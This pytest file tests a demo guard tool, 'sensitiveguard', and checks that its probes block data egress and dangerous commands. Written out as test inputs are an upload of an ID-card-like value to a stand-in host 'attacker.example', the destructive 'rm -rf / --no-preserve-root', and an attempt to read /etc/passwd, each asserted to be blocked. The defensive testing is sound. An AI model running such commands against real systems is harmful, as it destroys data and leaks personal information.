"""The bundled demo corpus is part of the contract, so CI runs it too."""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest


DEMO_DIR = Path(__file__).resolve().parents[2] / "examples" / "sensitiveguard" / "demo_server"


@pytest.fixture(scope="module")
def demo() -> tuple[object, object]:
    sys.path.insert(0, str(DEMO_DIR))
    try:
        import probes
        import run_cases
    finally:
        sys.path.remove(str(DEMO_DIR))
    return probes, run_cases


def test_every_bundled_case_passes(demo: tuple[object, object]) -> None:
    _, run_cases = demo
    cases = run_cases.load_cases(run_cases.CASES_PATH)
    assert cases, "用例集不应为空"

    failures: list[str] = []
    for case in cases:
        observed = run_cases.run_case(case)
        for message in run_cases.check(case, observed):
            failures.append(f"{case['id']}: {message}")

    assert not failures, "\n".join(failures)


def test_the_corpus_covers_every_probe(demo: tuple[object, object]) -> None:
    _, run_cases = demo
    probes_used = {case["probe"] for case in run_cases.load_cases(run_cases.CASES_PATH)}

    assert probes_used == {"detect", "command", "egress", "structured"}


def test_case_file_is_valid_jsonl_with_unique_ids() -> None:
    lines = [line for line in (DEMO_DIR / "cases.jsonl").read_text(encoding="utf-8").splitlines() if line.strip()]
    cases = [json.loads(line) for line in lines]

    identifiers = [case["id"] for case in cases]
    assert len(identifiers) == len(set(identifiers))
    assert all(case.get("title") and case.get("group") for case in cases)


def test_the_demo_never_reaches_a_wire_it_should_not(demo: tuple[object, object]) -> None:
    probes, _ = demo

    blocked = probes.egress_probe("http", "https://attacker.example/upload", "IDCARD 440101199001011234")

    assert blocked["tool_result"]["status"] == "BLOCKED"
    assert blocked["wire_call_count"] == 0
    assert blocked["leaked_values"] == []


def test_the_command_probe_never_executes_anything(demo: tuple[object, object]) -> None:
    probes, _ = demo

    # A command that would be destructive if the probe ever ran it.
    result = probes.command_probe("rm -rf / --no-preserve-root")

    assert result["inspection"]["verdict"] == "BLOCK"
    assert result["structured_api"]["accepted"] is False


def test_the_structured_path_only_runs_declared_capabilities(demo: tuple[object, object]) -> None:
    probes, _ = demo

    authorized = probes.structured_probe()
    denied = probes.structured_probe(["-l", "/etc/passwd"])

    assert authorized["tool_result"]["status"] == "ALLOWED"
    assert authorized["executor_invocations"] == 1
    assert denied["tool_result"]["status"] == "BLOCKED"
    assert denied["executor_invocations"] == 0
